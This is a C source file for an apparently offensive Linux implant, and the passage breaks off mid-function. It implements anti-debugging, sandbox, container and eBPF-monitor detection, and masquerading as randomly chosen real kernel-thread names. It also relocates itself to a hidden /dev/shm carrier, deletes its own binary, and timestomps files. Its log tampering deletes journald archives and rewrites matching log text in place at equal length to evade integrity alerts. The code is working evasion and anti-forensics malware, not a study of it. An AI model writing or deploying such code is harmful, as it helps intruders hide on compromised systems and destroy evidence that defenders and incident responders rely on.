/// opsec.c -- OPSEC checks + offensive capabilities for Linux agent
/// Anti-debug, VM/hypervisor detection, container detection, eBPF detection,
/// process masquerading, timestomping, log evasion, ptrace injection, memfd migrate
/// Uses only direct syscalls — zero libc dependency.

#include "opsec.h"
#include "crt.h"
#include "types.h"
#include "strings_obf.h"
#include "timing.h"       // ax_monotonic_ms —— B10 的退避闸门用
// AxMemfdCreateRandom lives in bof_api.c (compiled into the agent) — reuse it
// here instead of a second copy of the hex-name generator.
#include "bof_api.h"

#ifdef ARCH_X86_64
#include "syscalls_x64.h"
#endif
#ifdef ARCH_AARCH64
#include "syscalls_aarch64.h"
#endif

#define O_RDONLY    0
#define O_WRONLY    1
#define O_RDWR     2
#define O_CREAT    0100
#define O_TRUNC    01000

#define PTRACE_TRACEME  0
#define PTRACE_PEEKTEXT 1
#define PTRACE_POKETEXT 4
#define PTRACE_GETREGS  12
#define PTRACE_SETREGS  13
#define PTRACE_ATTACH   16
#define PTRACE_DETACH   17

#define PR_SET_NAME  15

#define MFD_CLOEXEC  0x0001U

#ifndef AT_FDCWD
#define AT_FDCWD     -100
#endif

// BPF commands
#define BPF_PROG_GET_NEXT_ID   11
#define BPF_PROG_GET_FD_BY_ID  13
#define BPF_OBJ_GET_INFO_BY_FD 15

// BPF program types (monitoring-relevant)
#define BPF_PROG_TYPE_KPROBE        1
#define BPF_PROG_TYPE_TRACEPOINT    5
#define BPF_PROG_TYPE_RAW_TRACEPOINT 17
#define BPF_PROG_TYPE_LSM           29

// ── Helpers ──

/// Read a small file via direct syscall. Returns bytes read, -1 on error.
static int read_file(const char *path, char *buf, int max_len) {
    int fd = sys_open(path, O_RDONLY, 0);
    if (fd < 0) return -1;

    int total = 0;
    while (total < max_len - 1) {
        long n = sys_read(fd, buf + total, (size_t)(max_len - 1 - total));
        if (n <= 0) break;
        total += (int)n;
    }
    buf[total] = '\0';
    sys_close(fd);
    return total;
}

/// Check if a file exists (can be opened)
static int file_exists(const char *path) {
    int fd = sys_open(path, O_RDONLY, 0);
    if (fd < 0) return 0;
    sys_close(fd);
    return 1;
}

/// Case-insensitive substring search in buf
static int contains_ci(const char *haystack, const char *needle) {
    if (!*needle) return 1;
    int nlen = (int)ax_strlen(needle);

    for (; *haystack; haystack++) {
        int match = 1;
        for (int i = 0; i < nlen; i++) {
            char h = haystack[i];
            char n = needle[i];
            if (!h) { match = 0; break; }
            if (h >= 'A' && h <= 'Z') h += 32;
            if (n >= 'A' && n <= 'Z') n += 32;
            if (h != n) { match = 0; break; }
        }
        if (match) return 1;
    }
    return 0;
}

/// Write all bytes to fd
static int write_all(int fd, const void *buf, size_t len) {
    const uint8_t *p = (const uint8_t *)buf;
    size_t remaining = len;
    while (remaining > 0) {
        long n = sys_write(fd, p, remaining);
        if (n < 0) return -1;
        p += n;
        remaining -= (size_t)n;
    }
    return 0;
}

// ══════════════════════════════════════════════════════════════════════
// Anti-Debug
// ══════════════════════════════════════════════════════════════════════

int opsec_anti_debug(void) {
    // 1. Check /proc/self/status for TracerPid (non-invasive)
    char _path_status[64];
    DEOBF(OBF_PROC_SELF_STATUS, _path_status);
    char status_buf[2048];
    if (read_file(_path_status, status_buf, sizeof(status_buf)) > 0) {
        char *tracer = ax_strstr(status_buf, "TracerPid:");
        if (tracer) {
            tracer += 10;
            while (*tracer == ' ' || *tracer == '\t') tracer++;
            int pid = ax_atoi(tracer);
            if (pid != 0) {
                ZERO_STR(_path_status, sizeof(_path_status));
                return -1;  // Non-zero TracerPid → debugger attached
            }
        }
    }
    ZERO_STR(_path_status, sizeof(_path_status));

    // 2. Fork-based ptrace check — child attempts TRACEME, parent reads result
    //    This avoids leaving the main process in a traced state.
    {
        int pipefd[2];
        if (sys_pipe2(pipefd, 0) < 0) goto skip_ptrace;

        int child = sys_fork();
        if (child < 0) {
            sys_close(pipefd[0]);
            sys_close(pipefd[1]);
            goto skip_ptrace;
        }

        if (child == 0) {
            // Child: try TRACEME — if we're being traced, this fails
            sys_close(pipefd[0]);
            uint8_t result = 0;
            if (sys_ptrace(PTRACE_TRACEME, 0, NULL, NULL) < 0)
                result = 1;  // Already traced
            sys_write(pipefd[1], &result, 1);
            sys_close(pipefd[1]);
            sys_exit_group(0);
        }

        // Parent: read child result
        sys_close(pipefd[1]);
        uint8_t result = 0;
        sys_read(pipefd[0], &result, 1);
        sys_close(pipefd[0]);

        // Wait for child to prevent zombie
        sys_wait4(child, NULL, 0, NULL);

        if (result != 0) return -1;
    }
skip_ptrace:

    // 3. Timing check — detect single-stepping
#ifdef ARCH_X86_64
    {
        uint32_t lo1, hi1, lo2, hi2;
        __asm__ volatile("rdtsc" : "=a"(lo1), "=d"(hi1));

        volatile int dummy = 0;
        for (int i = 0; i < 100; i++) dummy += i;
        (void)dummy;

        __asm__ volatile("rdtsc" : "=a"(lo2), "=d"(hi2));

        uint64_t t1 = ((uint64_t)hi1 << 32) | lo1;
        uint64_t t2 = ((uint64_t)hi2 << 32) | lo2;
        uint64_t delta = t2 - t1;

        // Normal: ~1000-50000 cycles. Single-step: >10M cycles.
        if (delta > 10000000) {
            return -1;
        }
    }
#endif

    return 0;
}

// ══════════════════════════════════════════════════════════════════════
// VM/Hypervisor Detection
// ══════════════════════════════════════════════════════════════════════

int opsec_vm_detect(void) {
    char dmi_buf[256];

    // 1. DMI product_name
    char _path_dmi[64];
    DEOBF(OBF_SYS_DMI_PRODUCT, _path_dmi);
    if (read_file(_path_dmi, dmi_buf, sizeof(dmi_buf)) > 0) {
        if (contains_ci(dmi_buf, "virtualbox")) return -1;
        if (contains_ci(dmi_buf, "vmware"))     return -1;
        if (contains_ci(dmi_buf, "qemu"))       return -1;
        if (contains_ci(dmi_buf, "kvm"))        return -1;
        if (contains_ci(dmi_buf, "xen"))        return -1;
        if (contains_ci(dmi_buf, "hyper-v"))    return -1;
        if (contains_ci(dmi_buf, "parallels"))  return -1;
    }

    // 2. DMI sys_vendor
    char _path_vendor[64];
    DEOBF(OBF_SYS_DMI_VENDOR, _path_vendor);
    if (read_file(_path_vendor, dmi_buf, sizeof(dmi_buf)) > 0) {
        if (contains_ci(dmi_buf, "vmware"))     return -1;
        if (contains_ci(dmi_buf, "innotek"))    return -1;
        if (contains_ci(dmi_buf, "qemu"))       return -1;
        if (contains_ci(dmi_buf, "xen"))        return -1;
        if (contains_ci(dmi_buf, "microsoft"))  return -1;
        if (contains_ci(dmi_buf, "parallels"))  return -1;
    }

    // 3. /proc/cpuinfo — check for "hypervisor" flag
    char _path_cpu[64];
    DEOBF(OBF_PROC_CPUINFO, _path_cpu);
    char cpuinfo_buf[4096];
    if (read_file(_path_cpu, cpuinfo_buf, sizeof(cpuinfo_buf)) > 0) {
        if (ax_strstr(cpuinfo_buf, "hypervisor")) return -1;
    }

    // 4. CPU count check — analysis VMs often have 1 core
    {
        int cpu_count = 0;
        char *p = cpuinfo_buf;
        while ((p = ax_strstr(p, "processor")) != NULL) {
            cpu_count++;
            p += 9;
        }
        if (cpu_count > 0 && cpu_count < 2) return -1;
    }

    // 5. RAM check — /proc/meminfo MemTotal < 2GB = suspect
    {
        char _path_mem[64];
        DEOBF(OBF_PROC_MEMINFO, _path_mem);
        char meminfo_buf[1024];
        if (read_file(_path_mem, meminfo_buf, sizeof(meminfo_buf)) > 0) {
            char *mt = ax_strstr(meminfo_buf, "MemTotal:");
            if (mt) {
                mt += 9;
                while (*mt == ' ') mt++;
                long kb = 0;
                while (*mt >= '0' && *mt <= '9') {
                    kb = kb * 10 + (*mt - '0');
                    mt++;
                }
                if (kb > 0 && kb < 2 * 1024 * 1024) return -1;
            }
        }
    }

    return 0;
}

// ══════════════════════════════════════════════════════════════════════
// Container Detection
// ══════════════════════════════════════════════════════════════════════

int opsec_container_detect(void) {
    char _path_dockerenv[64];
    DEOBF(OBF_DOCKERENV, _path_dockerenv);
    if (file_exists(_path_dockerenv)) return -1;

    char _path_cgroup[64];
    DEOBF(OBF_PROC_1_CGROUP, _path_cgroup);
    char cgroup_buf[2048];
    if (read_file(_path_cgroup, cgroup_buf, sizeof(cgroup_buf)) > 0) {
        if (ax_strstr(cgroup_buf, "docker"))     return -1;
        if (ax_strstr(cgroup_buf, "kubepods"))   return -1;
        if (ax_strstr(cgroup_buf, "lxc"))        return -1;
        if (ax_strstr(cgroup_buf, "containerd")) return -1;
        if (ax_strstr(cgroup_buf, "podman"))     return -1;
    }

    char selfcg_buf[1024];
    if (read_file("/proc/self/cgroup", selfcg_buf, sizeof(selfcg_buf)) > 0) {
        if (ax_strstr(selfcg_buf, "docker"))   return -1;
        if (ax_strstr(selfcg_buf, "kubepods")) return -1;
        if (ax_strstr(selfcg_buf, "podman"))   return -1;
    }

    char _path_k8s[64];
    DEOBF(OBF_K8S_SECRETS, _path_k8s);
    if (file_exists(_path_k8s)) return -1;
    if (file_exists("/var/run/secrets/kubernetes.io/serviceaccount/token")) return -1;

    return 0;
}

// ══════════════════════════════════════════════════════════════════════
// eBPF Detection — enumerate loaded BPF programs
// ══════════════════════════════════════════════════════════════════════

int opsec_ebpf_detect(void) {
    int monitoring_count = 0;

    // Method 1: Check /sys/fs/bpf/ — pinned BPF programs
    if (file_exists("/sys/fs/bpf")) {
        // If the directory exists and is accessible, BPF is active
        // We can't easily enumerate without getdents, so just flag it
    }

    // Method 2: bpf(BPF_PROG_GET_NEXT_ID) — iterate all loaded programs
    // attr = { start_id: u32, next_id: u32 }
    // Each iteration returns next program ID
    {
        // BPF attr union — we only need the first 8 bytes
        uint8_t attr[128];
        ax_memset(attr, 0, sizeof(attr));

        uint32_t start_id = 0;
        for (int iter = 0; iter < 1024; iter++) {
            // attr.__u32 start_id at offset 0
            ax_memcpy(attr, &start_id, 4);

            long ret = sys_bpf(BPF_PROG_GET_NEXT_ID, attr, sizeof(attr));
            if (ret < 0) break;  // No more programs

            // next_id at offset 4
            uint32_t next_id;
            ax_memcpy(&next_id, attr + 4, 4);

            // Get fd for this program
            ax_memset(attr, 0, sizeof(attr));
            ax_memcpy(attr, &next_id, 4);  // prog_id at offset 0
            long fd = sys_bpf(BPF_PROG_GET_FD_BY_ID, attr, sizeof(attr));
            if (fd >= 0) {
                // Get program info via BPF_OBJ_GET_INFO_BY_FD
                // info_by_fd: { bpf_fd: u32, info_len: u32, info: u64 (ptr) }
                uint8_t info[256];
                ax_memset(info, 0, sizeof(info));
                ax_memset(attr, 0, sizeof(attr));

                uint32_t bpf_fd = (uint32_t)fd;
                uint32_t info_len = (uint32_t)sizeof(info);
                uint64_t info_ptr = (uint64_t)(unsigned long)info;

                // bpf_attr for OBJ_GET_INFO_BY_FD:
                // offset 0: bpf_fd (u32)
                // offset 4: info_len (u32)
                // offset 8: info (u64, pointer)
                ax_memcpy(attr, &bpf_fd, 4);
                ax_memcpy(attr + 4, &info_len, 4);
                ax_memcpy(attr + 8, &info_ptr, 8);

                ret = sys_bpf(BPF_OBJ_GET_INFO_BY_FD, attr, 16);
                if (ret == 0) {
                    // bpf_prog_info.type is at offset 0 (u32)
                    uint32_t prog_type;
                    ax_memcpy(&prog_type, info, 4);

                    if (prog_type == BPF_PROG_TYPE_KPROBE ||
                        prog_type == BPF_PROG_TYPE_TRACEPOINT ||
                        prog_type == BPF_PROG_TYPE_RAW_TRACEPOINT ||
                        prog_type == BPF_PROG_TYPE_LSM) {
                        monitoring_count++;
                    }
                }
                sys_close((int)fd);
            }

            start_id = next_id;
        }
    }

    // Method 3: Filesystem indicators
    // Check for Falco / Tetragon / Cilium / Tracee
    if (file_exists("/etc/falco/falco.yaml"))           monitoring_count++;
    if (file_exists("/var/run/cilium/state"))            monitoring_count++;
    if (file_exists("/opt/tetragon"))                    monitoring_count++;

    return monitoring_count;  // 0 = safe, >0 = number of eBPF monitors found
}

// ══════════════════════════════════════════════════════════════════════
// Process Masquerading
// ══════════════════════════════════════════════════════════════════════

void opsec_masquerade(const char *fake_name, char **argv) {
    if (!fake_name || !*fake_name) return;

    // 1. prctl(PR_SET_NAME) → modifies /proc/self/comm (max 16 chars)
    sys_prctl(PR_SET_NAME, (unsigned long)fake_name, 0, 0, 0);

    // 2. Overwrite argv[0] → modifies /proc/self/cmdline
    if (argv && argv[0]) {
        // Calculate max length we can overwrite (argv[0] buffer)
        size_t old_len = ax_strlen(argv[0]);
        size_t new_len = ax_strlen(fake_name);
        size_t copy_len = new_len < old_len ? new_len : old_len;

        ax_memcpy(argv[0], fake_name, copy_len);
        // Zero-fill remainder to avoid partial old name showing
        if (copy_len < old_len) {
            ax_memset(argv[0] + copy_len, 0, old_len - copy_len);
        }
    }
}

// B9 — 伪装名策略：只伪装成**本机真实存在**的内核线程。
// 实现放在文件后半段（复用 P2-E 段的 `ax_readdir`），此处先前置声明。
static int opsec_kthread_name(char *out, size_t outsz);

// ══════════════════════════════════════════════════════════════════════
// P1 — /proc/<pid> 自覆盖（方案 §3.4 / 完全体清单 B2·B3·B4）
// ══════════════════════════════════════════════════════════════════════
// 长期驻留的是**本进程**，而 comm / exe / cwd 三项此前完全裸露：
//   comm → 可执行文件名（ps -eo comm、top、/proc/<pid>/comm 直接可读）
//   exe  → 落地磁盘路径，同时是 S1「磁盘零残留」的硬违规
//   cwd  → 投放目录，等于直接告诉对手文件从哪来
// 伪装名取自内核线程命名空间：真内核线程的 comm 是 "kworker/0:1"（不带方括号），
// 而 cmdline 为空 —— ps 对空 cmdline 才回退到用 comm 补方括号显示。我们的 cmdline
// 非空，ps 原样显示，所以 argv[0] 必须**自带**方括号，两边才同形。
// 名字每次随机选取 → 无固定 IOC；comm 与 argv[0] 永远指向同一个名字。
/// ── 自身载体化（B3 完整化 / 门 S1 的 exe 侧）────────────────────────────
/// 自删只保证「磁盘上不再有文件」，但 `/proc/<pid>/exe` 依旧回
/// `<原路径> (deleted)` —— 对手一眼看到**投放点**。这里把整条路线换成
/// "从 tmpfs 载体启动"：exe 变成 `/dev/shm/.m<8hex> (deleted)`，与"任何
/// 删掉自己的临时文件"同形，不再携带任何落地信息。
///
/// 成功不返回（execve 换掉映像）；任何一步失败都直接返回，让原映像照常
/// 继续 —— 载体化是**增强**，不是运行前提。零 libc 入口 `_start_c` 只做
/// "SIGPIPE 置 IGN + 取 g_argv"两件事，execve 后新进程会自动重做，
/// 所以此处换映像是干净的（没有需要显式清理的一次性状态）。
static void opsec_self_carrier(char **argv) {
    char self[256];
    long n = sys_readlink("/proc/self/exe", self, sizeof(self) - 1);
    if (n <= 0 || n >= (long)sizeof(self)) return;
    self[n] = '\0';

    // ① 已在载体上 → 绝不重复迁移，否则 execve 自我循环。判据只认
    //    /dev/shm/.m、/run/shm/.m 两个前缀（AxTmpfsCarrier 是唯一生产者）；
    //    用"含 .m"之类的宽判据会把"落地文件恰好叫 .m*"误判成已迁移。
    {
        static const char *pfx[2] = { "/dev/shm/.m", "/run/shm/.m" };
        for (int i = 0; i < 2; i++) {
            const char *p = pfx[i];
            int k = 0;
            while (p[k] && k < (int)n && self[k] == p[k]) k++;
            if (p[k] == '\0') return;
        }
    }

    // ② 只剩 "(deleted)" 后缀 = 原文件已不在（上一次迁移失败后自删过），
    //    读不出内容，直接放弃；自删那一步同样识别后缀，不会误删。
    if (n > 10) {
        const char *dl = " (deleted)";
        int i = 0;
        while (i < 10 && self[n - 10 + i] == dl[i]) i++;
        if (i == 10) return;
    }

    // ③ 读自身 ELF（上限与 spawn_detached 一致；静态 musl 载荷实测 ~52KB）
    char *buf = (char *)0;
    int len = AxReadFileToBuffer(self, &buf, 64 * 1024 * 1024);
    if (len <= 0 || !buf) return;

    int rfd = -1;
    int cfd = AxTmpfsCarrier(buf, len, &rfd);
    AxFree(buf);
    if (rfd >= 3) sys_close(rfd);   // 回退读端用不上：迁移失败就退回原映像
    if (cfd < 3) return;            // 拿不到 tmpfs → 原映像继续

    // ④ 原落地文件此刻已无任何引用（新映像走载体），显式删掉 —— 门 S1。
    //    紧接着的 execve 一旦失败，原映像仍在内存里（mmap 维持），不受影响；
    //    随后自删会读到 "(deleted)" 而跳过，不会二次误删。
    sys_unlink(self);

    // ⑤ execve("/proc/self/fd/N")，与 AxExecFdArgv 的既有用法一致。
    //    envp 传 NULL 而不是继承环境：一是零 libc 构建没有 environ 符号，
    //    二是真内核线程本来就没有用户态环境变量（顺带少一处指纹）。
    AxExecFdArgv(cfd, argv, (char **)0);

    // 只有 execve 失败才到得了这里；cfd 是 CLOEXEC，失败时仍开着。
    sys_close(cfd);
}

int opsec_self_cover(char **argv) {
    char comm[16];                       // PR_SET_NAME 上限 16 字节（含 NUL）
    comm[0] = '\0';

    char  *a0    = (argv && argv[0]) ? argv[0] : (char *)0;
    size_t a0len = a0 ? ax_strlen(a0) : 0;

    if (a0len >= 3 && a0[0] == '[' && a0[a0len - 1] == ']' && a0len - 2 < sizeof(comm)) {
        // ① 调用方（spawn_detached 的约定）已经把 argv[0] 伪装成方括号内核线程名
        //    → comm 直接取方括号里的内容。两处天然一致，且**不会发生截断**：
        //    argv[0] 的长度是既成事实，此时绝不能再往里写更长的串。
        ax_memcpy(comm, a0 + 1, a0len - 2);
        comm[a0len - 2] = '\0';
    } else {
        // ② 没有现成伪装（直接落地执行）→ 取一个**本机真实存在**的内核线程名（B9）。
        //    拿不到（/proc 不可读等）才退回最小池 —— 池里只留"任何 Linux 都必有"的名字，
        //    这是降级路径，正常情况下不会走到。
        char fake[16];
        if (!opsec_kthread_name(fake, sizeof(fake))) {
            static const char *fallback[] = { "kworker/0:1", "migration/0" };
            uint8_t r = 0;
            ax_random_bytes(&r, 1);
            const char *f = fallback[r % (sizeof(fallback) / sizeof(fallback[0]))];
            size_t fl = ax_strlen(f);
            ax_memcpy(fake, f, fl + 1);
        }
        size_t fl = ax_strlen(fake);
        if (fl > 0 && fl < sizeof(comm)) ax_memcpy(comm, fake, fl + 1);
        // argv[0] 写成**带方括号**的形式：真内核线程 cmdline 为空，ps 才回退到用
        // comm 补方括号显示；我们的 cmdline 非空，ps 原样显示 —— 不加这对括号，
        // `ps aux` 里就会与真 kworker 差一个字符。放不下就原样不动（宁可不伪装，
        // 也不写一个截断的半个名字）。
        if (a0 && fl > 0 && a0len >= fl + 3) {
            ax_memset(a0, 0, a0len);
            a0[0] = '[';
            ax_memcpy(a0 + 1, fake, fl);
            a0[fl + 1] = ']';
        }
    }
    if (comm[0]) sys_prctl(PR_SET_NAME, (unsigned long)comm, 0, 0, 0);

    // 3. cwd → "/"。systemd 服务未设 WorkingDirectory 时就是 "/"，最不显眼，
    //    同时不再泄漏投放目录。此后相对路径一律以 "/" 为基准。
    sys_chdir("/");

#ifndef BUILD_SO
    // 3.5 载体化（B3）：把自身迁到 tmpfs 载体并重新执行。**成功则本函数永不返回**。
    //     放在自删之前：迁移成功时原文件的清理由它自己 unlink；失败才轮到下面兜底。
    opsec_self_carrier(argv);

    // 4. 自删可执行文件。**只在独立 ELF 构建下做**：SO 构建里 /proc/self/exe
    //    指向宿主进程（ld.so.preload 注入场景），删它等于毁掉宿主的二进制。
    //    自删不影响运行 —— 映像已在内存里，inode 由 mmap 引用维持。
    char self[256];
    long n = sys_readlink("/proc/self/exe", self, sizeof(self) - 1);
    if (n > 0 && n < (long)sizeof(self)) {
        self[n] = '\0';
        // 目标已被 unlink 时内核会在路径后追加 " (deleted)"；识别出来避免
        // 把带后缀的串当真实路径传下去（重复 unlink 本身只回 ENOENT）。
        int is_deleted = 0;
        if (n > 9) {
            const char *dl = " (deleted)";
            int i = 0;
            while (i < 9 && self[n - 9 + i] == dl[i]) i++;
            is_deleted = (i == 9);
        }
        if (!is_deleted) sys_unlink(self);
    }
#endif
    return 0;
}

// ══════════════════════════════════════════════════════════════════════
// Timestomping — modify atime/mtime via utimensat
// ══════════════════════════════════════════════════════════════════════

int opsec_timestomp(const char *path, long ts_sec) {
    if (!path) return -1;

    struct linux_timespec times[2];

    if (ts_sec == 0) {
        // Special: set UTIME_OMIT-like behavior — copy from reference
        // Use a common system file as reference
        struct linux_stat st;
        if (sys_stat("/usr/bin/ls", &st) == 0) {
            times[0].tv_sec = (long)st.st_atime_sec;
            times[0].tv_nsec = (long)st.st_atime_nsec;
            times[1].tv_sec = (long)st.st_mtime_sec;
            times[1].tv_nsec = (long)st.st_mtime_nsec;
        } else {
            // Fallback: Jan 15, 2024 10:30:00 UTC
            times[0].tv_sec = 1705311000;
            times[0].tv_nsec = 0;
            times[1].tv_sec = 1705311000;
            times[1].tv_nsec = 0;
        }
    } else {
        times[0].tv_sec = ts_sec;
        times[0].tv_nsec = 0;
        times[1].tv_sec = ts_sec;
        times[1].tv_nsec = 0;
    }

    return sys_utimensat(AT_FDCWD, path, times, 0);
}

// ══════════════════════════════════════════════════════════════════════
// P2-E：日志处理重做（E3 journald / E4 等长改写 / E5 auditd 顺序）
// ══════════════════════════════════════════════════════════════════════
// 旧实现（truncate 一批 /var/log/*）的三个问题（方案 §4 S6 / §5 认知误区 10）：
//   ① **全量 truncate 自曝**：文件大小突变为 0 是强告警信号 —— 任何大小基线或
//      完整性监控都能发现，比"日志里多几行"严重得多；
//   ② **顺序错**：auditd 存活时清 audit.log 会**立刻**产生一条"日志被清"的审计
//      事件；而 `auditctl -e 0` 停审计同样会被记一条 —— 停审计本身也是可审计动作；
//   ③ **journald 完全没覆盖**：现代 systemd 发行版日志在 journal 而非 /var/log/*，
//      清 /var/log/messages 等于没清。
//
// 重做后的默认行为**不破坏任何文件的完整性**：
//   · auditd 存活 → 完全不碰 audit 日志，把决策交回操作员；
//   · journald   → 发 SIGUSR2 触发**轮转**（journald 文档化的"重新打开日志"信号，
//                  属正常运维动作、本身不告警），再删**归档**文件（与 logrotate /
//                  journalctl --vacuum 同形），**绝不删当前活跃的 *.journal**；
//   · 文本日志   → 默认**不动**；要清理就给 needle，走等长就地改写
//                  （opsec_redact_file：文件大小一个字节不变）；
//   · 定长登录记录（wtmp/btmp/lastlog/utmp）→ 默认**不动**：全清空会让 `last`/`who`
//     输出为空，比"里面有几条别人的登录"显眼得多。需要时由操作员显式给路径。

#define SIGUSR2 12

// linux_dirent64 的字段偏移。**不定义结构体**：d_name 是柔性数组，编译器填充是否
// 与内核 ABI 一致依赖细节；显式偏移更稳。
//   d_ino(8) d_off(8) d_reclen(u16@16) d_type(u8@18) d_name(@19)
#define AXDE_RECLEN_OFF 16
#define AXDE_NAME_OFF   19

static unsigned short ax_de_reclen(const char *p) {
    unsigned short v;
    ax_memcpy(&v, p + AXDE_RECLEN_OFF, sizeof(v));
    return v;
}

/// 遍历一个目录，对每个条目调 cb(name, ctx)；cb 返回非 0 提前结束。
/// 返回条目数，-1 = 目录打不开。
static int ax_readdir(const char *dir, int (*cb)(const char *, void *), void *ctx) {
    int fd = sys_open(dir, O_RDONLY, 0);
    if (fd < 0) return -1;
    char buf[4096];
    int cnt = 0;
    for (;;) {
        long n = sys_getdents64(fd, buf, sizeof(buf));
        if (n <= 0) break;
        for (long off = 0; off < n; ) {
            const char *de = buf + off;
            unsigned short rl = ax_de_reclen(de);
            if (rl < (unsigned short)(AXDE_NAME_OFF + 1)) break;   // 损坏，停
            cnt++;
            if (cb && cb(de + AXDE_NAME_OFF, ctx) != 0) { sys_close(fd); return cnt; }
            off += rl;
        }
    }
    sys_close(fd);
    return cnt;
}

/// /proc/<pid>/comm == name ?
static int ax_comm_is(int pid, const char *name) {
    char p[48], c[32];
    ax_snprintf(p, sizeof(p), "/proc/%d/comm", pid);
    int n = read_file(p, c, sizeof(c) - 1);
    if (n <= 0) return 0;
    while (n > 0 && (c[n - 1] == '\n' || c[n - 1] == ' ' || c[n - 1] == '\t')) c[--n] = '\0';
    return ax_strcmp(c, name) == 0;
}

struct ax_comm_scan { const char *name; int pid; };

static int ax_comm_cb(const char *nm, void *ctx) {
    struct ax_comm_scan *s = (struct ax_comm_scan *)ctx;
    int pid = 0;
    for (const char *q = nm; *q; q++) {
        if (*q < '0' || *q > '9') return 0;          // 只看 /proc/<pid> 数字目录
        pid = pid * 10 + (*q - '0');
        if (pid > 0x7ffffff) return 0;
    }
    if (pid <= 0) return 0;
    if (ax_comm_is(pid, s->name)) { s->pid = pid; return 1; }
    return 0;
}

/// 扫 /proc 找 comm == name 的进程，返回 pid；找不到返回 -1。
/// **只读 /proc**：不 execve `auditctl` / `systemctl` —— 那本身就是一条审计事件。
static int ax_find_proc_by_comm(const char *name) {
    struct ax_comm_scan s;
    s.name = name; s.pid = -1;
    ax_readdir("/proc", ax_comm_cb, &s);
    return s.pid;
}

/// E5：auditd 是否存活。
/// ① 先看 pid 文件里的 pid 是否活着且 comm 对得上；
/// ② 回退到 /proc 扫描 comm == "auditd"（auditd 也可能不以 pid 文件启动）。
int opsec_auditd_alive(void) {
    static const char *pids[] = { "/run/auditd.pid", "/var/run/auditd.pid" };
    for (unsigned i = 0; i < sizeof(pids) / sizeof(pids[0]); i++) {
        char b[32];
        int n = read_file(pids[i], b, sizeof(b) - 1);
        if (n <= 0) continue;
        int pid = 0;
        for (int k = 0; k < n && b[k] >= '0' && b[k] <= '9'; k++) pid = pid * 10 + (b[k] - '0');
        if (pid > 0 && ax_comm_is(pid, "auditd")) return 1;
    }
    return ax_find_proc_by_comm("auditd") > 0;
}

// ── E3：journald ──

struct ax_jpurge { const char *dir; int n; };

static int ax_jpurge_cb(const char *nm, void *ctx) {
    struct ax_jpurge *j = (struct ax_jpurge *)ctx;
    // 只删**归档**文件：journald 轮转后把原先的活跃文件改名成
    //   system@<seq>-<id>.journal（**含 '@'**）
    // 活跃文件叫 system.journal / user.journal（不含 '@'）→ 绝不碰。
    // *.journal~ 是正在写的离线文件，同样不碰。
    size_t l = ax_strlen(nm);
    if (l < 10) return 0;
    if (ax_strcmp(nm + l - 8, ".journal") != 0) return 0;
    int has_at = 0;
    for (size_t i = 0; i < l; i++) if (nm[i] == '@') { has_at = 1; break; }
    if (!has_at) return 0;
    char path[512];
    if (ax_snprintf(path, sizeof(path), "%s/%s", j->dir, nm) <= 0) return 0;
    if (sys_unlink(path) == 0) j->n++;
    return 0;
}

struct ax_jtop { int n; };

static int ax_jtop_cb(const char *nm, void *ctx) {
    struct ax_jtop *t = (struct ax_jtop *)ctx;
    if (nm[0] == '.') return 0;
    char d[512];
    if (ax_snprintf(d, sizeof(d), "/var/log/journal/%s", nm) <= 0) return 0;
    struct ax_jpurge j;
    j.dir = d; j.n = 0;
    ax_readdir(d, ax_jpurge_cb, &j);
    t->n += j.n;
    return 0;
}

/// E3：journald 处理。返回删掉的归档文件数；0 = 无需处理。
/// 非持久化（/var/log/journal 不存在，日志在 /run/log/journal）时**什么都不做**：
/// 那份日志本就在内存里、reboot 即失，动了反而多一次 unlink 事件。
int opsec_journal_purge(void) {
    if (!file_exists("/var/log/journal")) return 0;
    // 先轮转：SIGUSR2 是 journald 文档化的"重新打开日志文件"信号，属正常运维动作，
    // 自身不产生告警。轮转后原先的活跃文件变成 system@*.journal（= 可安全删除的归档）。
    int pid = ax_find_proc_by_comm("systemd-journal");
    if (pid > 0) {
        sys_kill(pid, SIGUSR2);
        sys_sleep(2);
    }
    struct ax_jtop t;
    t.n = 0;
    ax_readdir("/var/log/journal", ax_jtop_cb, &t);
    return t.n;
}

// ── E4：等长就地改写（替代 truncate）──

#define AX_REDACT_BUF 8192

/// 在 buf[0..len) 里从 from 起找 needle，返回索引或 -1。
static int ax_find_at(const char *buf, int len, const char *nd, int nl, int from) {
    if (nl <= 0) return -1;
    for (int i = from; i + nl <= len; i++) {
        int k = 0;
        while (k < nl && buf[i + k] == nd[k]) k++;
        if (k == nl) return i;
    }
    return -1;
}

/// E4：把 path 里的 needles[j] **等长**改写为 subs[j]。
/// 替换串长度按 needle 对齐：不足右侧补 '0'，超长截断 —— 所以
/// **文件大小一个字节都不变**（"文件归零"这类大小突变告警随之消失）。
/// 内存有界：缓冲区 AX_REDACT_BUF + 最多 (maxneedle-1) 字节的跨块重叠回退，
/// 绝不整文件读入（目标是别人的机器，不能假设有内存）。
/// 返回改写次数，-1 = 打不开。
int opsec_redact_file(const char *path, const char *const *needles,
                      const char *const *subs, int n) {
    if (!path || !needles || !subs || n <= 0) return -1;
    int maxn = 0;
    for (int j = 0; j < n; j++) {
        int l = (int)ax_strlen(needles[j]);
        if (l > maxn) maxn = l;
    }
    if (maxn <= 0 || maxn * 2 >= AX_REDACT_BUF) return -1;

    int fd = sys_open(path, O_RDWR, 0);
    if (fd < 0) return -1;

    char buf[AX_REDACT_BUF];
    char repl[512];
    long base = 0;   // buf[0] 对应的文件偏移
    int  have = 0;   // buf 中有效字节数（含上一块回退的尾部）
    int  hits = 0;

    for (;;) {
        long want = (long)(AX_REDACT_BUF - have);
        long r = sys_read(fd, buf + have, (size_t)want);
        // 短读（r < want）或读空 = 文件尾。此时尾部的 maxn-1 字节已**不可能**是
        // "被块边界截断的 needle"，必须全量处理 —— 否则文件最后 maxn-1 字节永远扫不到，
        // 而且小文件（< 8192）会整块被当成"待续"而不做任何替换。
        int eof = (r <= 0) || (r < want);
        int len = have + (int)(r > 0 ? r : 0);
        int consumed = eof ? len : (len - (maxn - 1));
        if (consumed <= 0) { consumed = len; eof = 1; }   // 兜底：绝不让非 eof 下 consumed==0 死循环

        for (int j = 0; j < n; j++) {
            int nl = (int)ax_strlen(needles[j]);
            int sl = (int)ax_strlen(subs[j]);
            if (nl <= 0 || nl > (int)sizeof(repl)) continue;
            for (int q = 0; q < nl; q++) repl[q] = (q < sl) ? subs[j][q] : '0';
            int at = 0;
            while ((at = ax_find_at(buf, consumed, needles[j], nl, at)) >= 0) {
                if (sys_lseek(fd, base + at, AX_SEEK_SET) < 0) break;
                if (write_all(fd, repl, (size_t)nl) == 0) hits++;
                // 同步回 buf：重叠区会被下一块重扫，不同步就会重复计数
